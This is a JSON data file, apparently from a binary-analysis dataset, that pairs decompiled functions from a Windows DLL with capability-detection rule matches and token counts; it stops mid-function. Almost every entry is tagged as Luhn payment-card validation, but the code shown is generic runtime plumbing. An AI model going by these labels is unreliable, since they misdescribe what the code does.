    "180091b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180091b24(ulong arg1)\n\n{\n    fcn.180092004(*0x180129130);\n    // WARNING: Could not recover jumptable at 0x000180091b41. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de8f0)(arg1);\n    return;\n}\n",
        "token_count": 82
    },
    "180092fd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180092fd4(int64_t arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint extraout_EAX;\n    uint extraout_var;\n    uchar auStack40 [32];\n    \n    fcn.1800920f4(0, 0x10000, 0x180094180, arg1, 0, 0);\n    *(arg1 + 0x68) = CONCAT44(extraout_var, extraout_EAX);\n    if (CONCAT44(extraout_var, extraout_EAX) == 0) {\n        uVar4 = (**0x1800de400)();\n        uVar3 = uVar4 & 0xffff | 0x80070000;\n        if (uVar4 < 1) {\n            uVar3 = uVar4;\n        }\n        fcn.1800925a8(auStack40, uVar3);\n        fcn.1800add8c(auStack40, 0x18011f130);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    iVar2 = (**0x1800de338)(CONCAT44(extraout_var, extraout_EAX));\n    if (iVar2 != 0) {\n        return;\n    }\n    uVar4 = (**0x1800de400)();\n    uVar3 = uVar4 & 0xffff | 0x80070000;\n    if (uVar4 < 1) {\n        uVar3 = uVar4;\n    }\n    fcn.1800925a8(auStack40, uVar3);\n    fcn.1800add8c(auStack40, 0x18011f130);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 414
    },
    "180091f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180091f94(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uchar auStack40 [40];\n    \n    iVar3 = (**0x1800de3f0)();\n    if (iVar3 != 0) {\n        return;\n    }\n    uVar4 = (**0x1800de400)();\n    uVar2 = uVar4 & 0xffff | 0x80070000;\n    if (uVar4 < 1) {\n        uVar2 = uVar4;\n    }\n    fcn.1800925a8(auStack40, uVar2);\n    fcn.1800add8c(auStack40, 0x18011f130);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 195
    },
    "18009234": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18009234c(int32_t *arg1)\n\n{\n    int32_t iVar1;\n    uchar auStack40 [8];\n    uint uStack32;\n    ulong uStack24;\n    \n    fcn.18009e690();\n    iVar1 = *arg1;\n    *arg1 = 1;\n    if (iVar1 != 0) {\n        uStack32 = 0;\n        uStack24 = 0x1800923a0;\n        do {\n            fcn.180091334(auStack40);\n            iVar1 = *arg1;\n            *arg1 = 1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "1800923a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.1800923a8(uint32_t *arg1)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    \n    fcn.18009e690();\n    if (*arg1 == 0) {\n        uVar3 = 1;\n        uVar1 = *arg1;\n        *arg1 = 1;\n        uVar2 = uVar1;\n        if (uVar1 == 0) goto code_r0x0001800923d2;\n    }\n    uVar3 = 0;\n    uVar2 = fcn.18009e690();\ncode_r0x0001800923d2:\n    return uVar2 & 0xffffffffffffff00 | uVar3;\n}\n",
        "token_count": 171
    },
    "18009304": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18009304c(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uchar auStack32 [8];\n    uint uStack24;\n    ulong uStack16;\n    \n    if (*0x180129214 != 0) {\n        uStack24 = 0;\n        uStack16 = 0x1800923a0;\n        do {\n            *0x180129214 = 1;\n            fcn.180091334(auStack32);\n        } while (*0x180129214 != 0);\n    }\n    *0x180129214 = 1;\n    if (*0x180129178 == 0) {\n        iVar2 = fcn.18008fb2c(0xe8);\n        if (iVar2 == 0) {\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = fcn.180092684(iVar2);\n        }\ncode_r0x000180093193:\n        LOCK();\n        *(iVar2 + 8) = *(iVar2 + 8) + 1;\n        *0x180129178 = fcn.180092004(iVar2);\n    }\n    else {\n        iVar2 = fcn.180092004(*0x180129178);\n        do {\n            iVar1 = *(iVar2 + 8);\n            if (iVar1 == 0) {\n                iVar2 = fcn.18008fb2c(0xe8);\n                if (iVar2 == 0) {\n                    iVar2 = 0;\n                }\n                else {\n                    iVar2 = fcn.180092684(iVar2);\n                }\n                goto code_r0x000180093193;\n            }\n            LOCK();\n        } while (iVar1 != *(iVar2 + 8));\n        *(iVar2 + 8) = iVar1 + 1;\n    }\n    *0x180129214 = 0;\n    return iVar2;\n}\n",
        "token_count": 419
    },
    "18009493": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.180094934(void)\n\n{\n    uchar auStack32 [8];\n    uint uStack24;\n    ulong uStack16;\n    \n    if (*0x1801291a0 == 0) {\n        if (*0x180129214 != 0) {\n            uStack24 = 0;\n            uStack16 = 0x1800923a0;\n            do {\n                *0x180129214 = 1;\n                fcn.180091334(auStack32);\n            } while (*0x180129214 != 0);\n        }\n        *0x180129214 = 1;\n        if (*0x1801291a0 == 0) {\n            fcn.18009527c(0);\n        }\n        *0x180129214 = 0;\n    }\n    return *0x1801291a0;\n}\n",
        "token_count": 189
    },
    "180094c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.180094c48(void)\n\n{\n    uchar auStack32 [8];\n    uint uStack24;\n    ulong uStack16;\n    \n    if (*0x1801291a8 == 0) {\n        if (*0x180129214 != 0) {\n            uStack24 = 0;\n            uStack16 = 0x1800923a0;\n            do {\n                *0x180129214 = 1;\n                fcn.180091334(auStack32);\n            } while (*0x180129214 != 0);\n        }\n        *0x180129214 = 1;\n        if (*0x1801291a8 == 0) {\n            fcn.18009527c(0);\n        }\n        *0x180129214 = 0;\n    }\n    return *0x1801291a8;\n}\n",
        "token_count": 190
    },
    "18009712": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.180097128(void)\n\n{\n    uchar auStack32 [8];\n    uint uStack24;\n    ulong uStack16;\n    \n    if (*0x1801291b0 == 0) {\n        if (*0x180129214 != 0) {\n            uStack24 = 0;\n            uStack16 = 0x1800923a0;\n            do {\n                *0x180129214 = 1;\n                fcn.180091334(auStack32);\n            } while (*0x180129214 != 0);\n        }\n        *0x180129214 = 1;\n        if (*0x1801291b0 == 0) {\n            fcn.18009697c();\n        }\n        *0x180129214 = 0;\n    }\n    return *0x1801291b0;\n}\n",
        "token_count": 187
    },
    "180096e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.180096e10(int64_t arg1, int64_t arg2)\n\n{\n    uchar (*pauVar1) [16];\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int64_t arg3;\n    uchar in_R8B;\n    uint64_t uVar4;\n    uint64_t arg2_00;\n    bool bVar5;\n    \n    fcn.18009517c(arg1);\n    pauVar1 = arg2 + 0x70;\n    *pauVar1 = ZEXT816(0);\n    *(arg2 + 0x80) = ZEXT816(0);\n    *(arg2 + 0x90) = ZEXT816(0);\n    fcn.18009577c(arg1, 0, arg2, pauVar1);\n    uVar3 = *(arg2 + 0xe8) + *(arg2 + 0xb0);\n    *(arg2 + 0x98) = in_R8B;\n    uVar2 = *(arg2 + 0xec);\n    if (uVar3 <= *(arg2 + 0xec)) {\n        uVar2 = uVar3;\n    }\n    *(arg2 + 0x90) = uVar2;\n    **(arg1 + 0x78) = pauVar1;\n    arg3 = *(arg1 + 0x98);\n    bVar5 = arg3 == 0;\n    arg2_00 = 1;\n    while( true ) {\n        if (bVar5) {\n            arg3 = 0;\n        }\n        else {\n            arg3 = *(arg3 + 0x30);\n        }\n        if (arg3 == 0) break;\n        uVar4 = arg2_00;\n        if (arg3 != arg2) {\n            pauVar1 = arg3 + 0x70;\n            *pauVar1 = ZEXT816(0);\n            *(arg3 + 0x80) = ZEXT816(0);\n            *(arg3 + 0x90) = ZEXT816(0);\n            fcn.18009577c(arg1, arg2_00, arg3, pauVar1);\n            uVar3 = *(arg3 + 0xe8) + *(arg3 + 0xb0);\n            uVar2 = *(arg3 + 0xec);\n            if (uVar3 <= *(arg3 + 0xec)) {\n                uVar2 = uVar3;\n            }\n            uVar4 = arg2_00 + 1;\n            *(arg3 + 0x90) = uVar2;\n            *(*(arg1 + 0x78) + arg2_00 * 8) = pauVar1;\n        }\n        bVar5 = arg3 == *(arg1 + 0x98);\n        arg2_00 = uVar4;\n    }\n    return;\n}\n",
        "token_count": 630
    },
    "18009b8d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18009b8dc(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    uint8_t uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int64_t iVar9;\n    uint64_t arg2;\n    uint8_t uVar10;\n    uint uStack56;\n    uint uStack52;\n    ulong uStack48;\n    ulong uStack40;\n    \n    if (*(arg1 + 0x2e0) < 1) {\n        return;\n    }\n    uVar10 = 0;\n    bVar3 = false;\n    while (iVar9 = fcn.1800994d0(arg1),  iVar9 != 0) {\n        uVar4 = fcn.18009a340(arg1, iVar9);\n        uVar10 = uVar10 | uVar4;\n        if ((*(arg1 + 0x2a8) < 1) || (iVar7 = fcn.18009ba6c(arg1, 1),  iVar7 != 0)) goto code_r0x00018009b93d;\n    }\n    bVar3 = true;\ncode_r0x00018009b93d:\n    if ((*(arg1 + 0x280) != 0) || ((!bVar3 && (*(arg1 + 0x2a8) < 1)))) {\n        iVar7 = *(arg1 + 0x2e0);\n        LOCK();\n        piVar1 = arg1 + 0x2e0;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 - iVar7;\n        if (iVar2 != iVar7) goto code_r0x00018009b9c7;\n        if (*(arg1 + 0x280) == 0) {\n            return;\n        }\n        if (uVar10 != 0) {\n            return;\n        }\n        iVar9 = fcn.180099784(arg1);\n        uStack56 = 0;\n        uStack48 = 0;\n        uStack52 = 0;\n        uStack40 = 0;\n        cVar5 = fcn.18009b46c(arg1, *(iVar9 + 0x10), &uStack56, 0xb);\n        if (cVar5 != '\\0') {\n            return;\n        }\n    }\n    *(arg1 + 0x2e0) = 1;\ncode_r0x00018009b9c7:\n    uVar6 = fcn.18009ba6c(arg1, 1);\n    iVar7 = fcn.180091e1c();\n    uVar8 = iVar7 - *(arg1 + 0x2c0);\n    uVar6 = -(uVar8 < uVar6) & uVar6 - uVar8;\n    arg2 = uVar6;\n    if ((bVar3) && (arg2 = uVar6,  uVar6 < 500)) {\n        arg2 = 500;\n    }\n    fcn.180098228(arg1, arg2);\n    return;\n}\n",
        "token_count": 704
    },
    "18009ed7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18009ed70(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint64_t *puVar3;\n    ulong *puVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    char cVar7;\n    uchar *arg1_00;\n    uint64_t **ppuVar8;\n    uint64_t arg1_01;\n    bool bVar9;\n    uchar auStack32 [8];\n    ulong uStack24;\n    \n    bVar9 = false;\n    if ((*(arg1 + 0xa8) == arg1) || ((*(arg1 + 200) & 1) != 0)) {\n        cVar7 = fcn.1800a0020(arg1);\n        bVar9 = cVar7 == '\\0';\n        if (*(arg1 + 0xa8) == arg1) {\n            iVar6 = *(arg1 + 0xb0);\n            while (iVar6 != 0) {\n                iVar5 = *(iVar6 + 0xb0);\n                fcn.18009fe68(iVar6);\n                iVar6 = iVar5;\n            }\n        }\n    }\n    iVar6 = *(arg1 + 0xb8);\n    if (iVar6 != 0) {\n        if (*(iVar6 + 8) != 0) {\n            fcn.18008fb24(*(iVar6 + 8));\n        }\n        fcn.18008fb24(iVar6);\n    }\n    arg1_01 = *(arg1 + 0x28) & 0xfffffffffffffffc;\n    if ((arg1_01 != 0) && (arg1_01 != 0xc)) {\n        fcn.1800d6a1c(arg1_01);\n        fcn.18008fb24(arg1_01);\n    }\n    if ((*(arg1 + 0x10) & 0xfffffffffffffffd) != 0) {\n        LOCK();\n        piVar1 = *(arg1 + 0x10) + 8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar2 == 1) {\n            (**0x1800de8f0)();\n        }\n    }\n    if (bVar9) {\n        fcn.180092578(auStack32);\n        arg1_00 = auStack32;\n        fcn.1800add8c(arg1_00, 0x18011f310);\n        fcn.1800d6a1c(arg1_00);\n        return;\n    }\n    uStack24 = 0xfffffffffffffffe;\n    fcn.1800912d8(arg1 + 0x70);\n    ppuVar8 = *(arg1 + 0x60);\n    if (0x1 < *(arg1 + 0x60)) {\n        do {\n            puVar3 = *ppuVar8;\n            cVar7 = (**0x1800de8f0)(ppuVar8[1], 0, ppuVar8);\n            if (cVar7 != '\\0') {\n                (**0x1800de8f0)();\n            }\n            ppuVar8 = puVar3;\n        } while (puVar3 != NULL);\n    }\n    puVar4 = *(arg1 + 0x68);\n    while (puVar4 != NULL) {\n        puVar4 = *puVar4;\n        (**0x1800de8f0)();\n    }\n    return;\n}\n",
        "token_count": 773
    },
    "1800a08b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800a08bc(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    int64_t arg1_00;\n    \n    iVar1 = 0x40;\n    arg1_00 = arg1;\n    do {\n        fcn.1800a096c(arg1_00);\n        arg1_00 = arg1_00 + 0x20;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    *(arg1 + 0x814) = 0;\n    *(arg1 + 0x818) = 0;\n    *(arg1 + 0x820) = 0;\n    *(arg1 + 0x824) = 0;\n    *(arg1 + 0x828) = 0;\n    *(arg1 + 0x82c) = 0;\n    *(arg1 + 0x830) = 0;\n    *(arg1 + 0x810) = arg3;\n    *(arg1 + 0x800) = arg4;\n    *(arg1 + 0x81c) = arg2;\n    *(arg1 + 0x834) = 1;\n    *(arg1 + 0x808) = arg3;\n    return arg1;\n}\n",
        "token_count": 295
    },
    "1800a2e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800a2e5c(void)\n\n{\n    fcn.180092004(*0x1801292c8);\n    // WARNING: Could not recover jumptable at 0x0001800a2e70. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de8f0)();\n    return;\n}\n",
        "token_count": 83
    },
    "1800a2e7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800a2e78(ulong arg1)\n\n{\n    (**0x1800de358)();\n    return arg1;\n}\n",
        "token_count": 32
    },
    "1800a618": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800a6180(uint32_t *arg1, uint64_t arg2, int64_t *arg3)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong *puVar7;\n    uint *puVar8;\n    ulong *puVar9;\n    int64_t *piVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    ulong *puVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    \n    uVar3 = arg1[2];\n    iVar1 = uVar3 * 2 + 2;\n    uVar11 = iVar1;\n    uVar4 = SUB168(ZEXT816(8) * ZEXT816(uVar11), 0);\n    if (SUB168(ZEXT816(8) * ZEXT816(uVar11) >> 0x40, 0) != 0) {\n        uVar4 = 0xffffffffffffffff;\n    }\n    iVar5 = fcn.18008ff14(uVar4);\n    uVar4 = *(arg1 + 4);\n    uVar6 = SUB168(ZEXT416(0x10) * ZEXT816(uVar11), 0);\n    if (SUB168(ZEXT416(0x10) * ZEXT816(uVar11) >> 0x40, 0) != 0) {\n        uVar6 = 0xffffffffffffffff;\n    }\n    puVar7 = fcn.18008ff14(uVar6);\n    puVar13 = puVar7;\n    if (puVar7 == NULL) {\n        puVar7 = NULL;\n    }\n    else {\n        for (; uVar11 != 0; uVar11 = uVar11 - 1) {\n            fcn.1800976cc(puVar13);\n            puVar13 = puVar13 + 2;\n        }\n    }\n    iVar2 = *(arg1 + 6);\n    uVar6 = *(arg1 + 8);\n    fcn.18009234c(uVar6);\n    uVar14 = *arg1;\n    uVar15 = arg1[1] - *arg1;\n    if (0 < uVar15) {\n        iVar12 = 0;\n        puVar13 = puVar7;\n        do {\n            *(iVar5 + iVar12 * 8) = *(*(arg1 + 4) + (arg1[2] & uVar14) * 8);\n            puVar9 = (arg1[2] & uVar14) * 0x10 + *(arg1 + 6);\n            *puVar13 = *puVar9;\n            *(puVar13 + 1) = *(puVar9 + 1);\n            uVar14 = uVar14 + 1;\n            iVar12 = iVar12 + 1;\n            puVar13 = puVar13 + 2;\n        } while (iVar12 < uVar15);\n    }\n    fcn.1800ae290(uVar15 * 8 + iVar5, 0, iVar1 - uVar15 << 3);\n    *(arg1 + 4) = iVar5;\n    *(arg1 + 6) = puVar7;\n    *arg1 = 0;\n    uVar3 = uVar3 * 2 + 1;\n    arg1[2] = uVar3;\n    if (*arg3 != 0) {\n        piVar10 = (uVar3 & uVar15) * 0x10 + *(arg1 + 6);\n        *piVar10 = *arg3;\n        *(piVar10 + 1) = *(arg3 + 1);\n        arg2 = arg2 | 1;\n        uVar3 = arg1[2];\n    }\n    *(*(arg1 + 4) + (uVar3 & uVar15) * 8) = arg2;\n    arg1[1] = uVar15 + 1;\n    fcn.180092394(uVar6);\n    fcn.18008fb24(uVar4);\n    uVar4 = 0;\n    if ((iVar2 != 0) && (uVar6 = *0x180129fa0,  uVar4 = (**0x1800de208)(*0x180129fa0, 0, iVar2),  uVar4 == 0)) {\n        puVar8 = fcn.1800ba53c(uVar6);\n        uVar3 = (**0x1800de400)();\n        uVar4 = fcn.1800ba484(uVar3);\n        *puVar8 = uVar4;\n    }\n    return uVar4;\n}\n",
        "token_count": 1040
    },
    "18009a24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18009a240(int64_t arg1, int64_t arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    fcn.18009234c(arg1 + 0x218);\n    do {\n        LOCK();\n        piVar1 = arg1 + 0x228;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + 1;\n    } while ((iVar2 + 2U & 0xfffffffe) == 0);\n    *(arg2 + 0x10) = iVar2 + 1;\n    *(arg2 + 0x18) = 0;\n    **(arg1 + 0x210) = arg2;\n    *(arg1 + 0x210) = arg2 + 0x18;\n    *(arg1 + 0x218) = 0;\n    // WARNING: Could not recover jumptable at 0x000180091f8c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de4c0)(*0x1801291d0);\n    return;\n}\n",
        "token_count": 255
    },
    "1800aa20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.1800aa20c(int64_t arg1, int64_t arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    \n    *(arg1 + 0x98) = arg2;\n    iVar3 = *(*(arg2 + 0x1a8) + 8);\n    if ((*(iVar3 + 0x27c) >> 0x1d & 1) != 0) {\n    // WARNING: Could not recover jumptable at 0x00018009a227. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x1800de8f0)(arg1);\n        return;\n    }\n    *(arg1 + 0x40) = 0x1800aa2c8;\n    *(arg1 + 0x48) = arg1;\n    fcn.18009234c(iVar3 + 0x218);\n    do {\n        LOCK();\n        piVar1 = iVar3 + 0x228;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + 1;\n    } while ((iVar2 + 2U & 0xfffffffe) == 0);\n    *(arg1 + 0x50) = iVar2 + 1;\n    *(arg1 + 0x58) = 0;\n    **(iVar3 + 0x210) = arg1 + 0x40;\n    *(iVar3 + 0x210) = arg1 + 0x58;\n    *(iVar3 + 0x218) = 0;\n    // WARNING: Could not recover jumptable at 0x000180091f8c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de4c0)(*0x1801291d0);\n    return;\n}\n",
        "token_count": 420
    },
    "1800aa2a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.1800aa2a0(int64_t arg1, int64_t arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    \n    *(arg1 + 0x98) = arg2;\n    iVar3 = *(*(arg2 + 0x1a8) + 8);\n    if ((*(iVar3 + 0x27c) >> 0x1d & 1) != 0) {\n    // WARNING: Could not recover jumptable at 0x00018009a227. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x1800de8f0)(arg1);\n        return;\n    }\n    *(arg1 + 0x40) = 0x1800aa2d8;\n    *(arg1 + 0x48) = arg1;\n    fcn.18009234c(iVar3 + 0x218);\n    do {\n        LOCK();\n        piVar1 = iVar3 + 0x228;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + 1;\n    } while ((iVar2 + 2U & 0xfffffffe) == 0);\n    *(arg1 + 0x50) = iVar2 + 1;\n    *(arg1 + 0x58) = 0;\n    **(iVar3 + 0x210) = arg1 + 0x40;\n    *(iVar3 + 0x210) = arg1 + 0x58;\n    *(iVar3 + 0x218) = 0;\n    // WARNING: Could not recover jumptable at 0x000180091f8c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de4c0)(*0x1801291d0);\n    return;\n}\n",
        "token_count": 421
    },
    "1800ad71": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.1800ad718(uint *arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    int32_t *piVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int64_t iVar11;\n    uint32_t uVar12;\n    int64_t iVar13;\n    int64_t in_stack_00000028;\n    uint uStack88;\n    uint uStack84;\n    uint uStack76;\n    uint uStack60;\n    \n    iVar11 = 0;\n    uVar6 = *(in_stack_00000028 + 0xc);\n    iVar5 = fcn.1800af208(in_stack_00000028, arg4);\n    if (uVar6 == 0) {\n        fcn.1800b1ebc();\n        pcVar3 = swi(3);\n        puVar7 = (*pcVar3)();\n        return puVar7;\n    }\n    iVar2 = *(arg4 + 8);\n    iVar13 = *(in_stack_00000028 + 0x10);\n    uVar12 = 0xffffffff;\n    uVar9 = uVar6;\n    do {\n        uVar10 = uVar9 - 1;\n        iVar1 = iVar2 + uVar10 * 0x14;\n        if ((*(iVar1 + 4 + iVar13) < iVar5) && (iVar5 <= *(iVar1 + 8 + iVar13))) break;\n        uVar9 = uVar10;\n    } while (uVar10 != 0);\n    if (uVar9 != 0) {\n        iVar11 = iVar13 + (uVar9 - 1) * 0x14 + iVar2;\n    }\n    piVar8 = iVar2 + iVar13;\n    uVar10 = 0;\n    uVar9 = 0xffffffff;\n    do {\n        uVar4 = uVar12;\n        if ((((iVar11 == 0) ||\n             ((*piVar8 != *(iVar11 + 4) && *(iVar11 + 4) <= *piVar8 &&\n              (piVar8[1] == *(iVar11 + 8) || piVar8[1] < *(iVar11 + 8))))) && (*piVar8 <= arg3)) &&\n           ((arg3 <= piVar8[1] && (uVar4 = uVar10,  uVar9 = uVar10,  uVar12 != 0xffffffff)))) {\n            uVar4 = uVar12;\n        }\n        uVar12 = uVar4;\n        uVar10 = uVar10 + 1;\n        piVar8 = piVar8 + 5;\n    } while (uVar10 < uVar6);\n    uVar6 = 0;\n    if (uVar12 != 0xffffffff) {\n        uVar6 = uVar12;\n    }\n    iVar5 = 0;\n    if (uVar12 != 0xffffffff) {\n        iVar5 = uVar9 + 1;\n    }\n    uStack88 = arg2;\n    uStack84 = arg2 >> 0x20;\n    *arg1 = uStack88;\n    arg1[1] = uStack84;\n    arg1[2] = uVar6;\n    arg1[3] = uStack76;\n    arg1[4] = uStack88;\n    arg1[5] = uStack84;\n    arg1[6] = iVar5;\n    arg1[7] = uStack60;\n    return arg1;\n}\n",
        "token_count": 817
    },
    "1800b075": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800b0758(void)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = *0x1801293c0;\n    while (uVar1 != 0) {\n        uVar1 = uVar1 - 1;\n        (**0x1800de4f0)(uVar1 * 0x28 + 0x180129398);\n        *0x1801293c0 = *0x1801293c0 - 1;\n    }\n    return 1;\n}\n",
        "token_count": 116
    },
    "1800b1d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.1800b1d68(uint8_t **arg1)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t uVar2;\n    uint8_t *arg2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int64_t iVar6;\n    \n    if (arg1 == NULL) {\n        puVar5 = fcn.1800ba53c(0);\n        *puVar5 = 0x16;\n        fcn.1800b3508();\n        return 0xffffffff;\n    }\n    ppuVar1 = arg1 + 2;\n    *ppuVar1 = *ppuVar1 + -1;\n    if (*ppuVar1 < 0) {\n        if (arg1 == NULL) {\n            puVar5 = fcn.1800ba53c(0);\n            *puVar5 = 0x16;\n            fcn.1800b3508();\n        }\n        else if (((*(arg1 + 0x14) >> 0xd & 1) != 0) && ((*(arg1 + 0x14) >> 0xc & 1) == 0)) {\n            if ((*(arg1 + 0x14) >> 1 & 1) == 0) {\n                LOCK();\n                *(arg1 + 0x14) = *(arg1 + 0x14) | 1;\n                if ((*(arg1 + 0x14) & 0x4c0) == 0) {\n                    fcn.1800c3a3c(arg1);\n                }\n                arg2 = arg1[1];\n                *arg1 = arg2;\n                uVar3 = fcn.1800c20cc(arg1);\n                iVar4 = fcn.1800c87fc(uVar3, arg2, *(arg1 + 4));\n                *(arg1 + 2) = iVar4;\n                if (1 < iVar4 + 1U) {\n                    if ((*(arg1 + 0x14) & 6) == 0) {\n                        iVar4 = fcn.1800c20cc(arg1);\n                        if ((iVar4 == -1) || (iVar4 = fcn.1800c20cc(arg1),  iVar4 == -2)) {\n                            iVar6 = 0x1801233c0;\n                        }\n                        else {\n                            iVar4 = fcn.1800c20cc(arg1);\n                            uVar3 = fcn.1800c20cc(arg1);\n                            iVar6 = *((iVar4 >> 6) * 8 + 0x180129850) + (uVar3 & 0x3f) * 0x48;\n                        }\n                        if ((*(iVar6 + 0x38) & 0x82) == 0x82) {\n                            LOCK();\n                            *(arg1 + 0x14) = *(arg1 + 0x14) | 0x20;\n                        }\n                    }\n                    if (((*(arg1 + 4) == 0x200) && ((*(arg1 + 0x14) >> 6 & 1) != 0)) && ((*(arg1 + 0x14) >> 8 & 1) == 0)\n                       ) {\n                        *(arg1 + 4) = 0x1000;\n                    }\n                    *(arg1 + 2) = *(arg1 + 2) + -1;\n                    uVar2 = **arg1;\n                    *arg1 = *arg1 + 1;\n                    return uVar2;\n                }\n                LOCK();\n                *(arg1 + 0x14) = *(arg1 + 0x14) | (-(iVar4 != 0) & 8) + 8;\n                *(arg1 + 2) = 0;\n            }\n            else {\n                LOCK();\n                *(arg1 + 0x14) = *(arg1 + 0x14) | 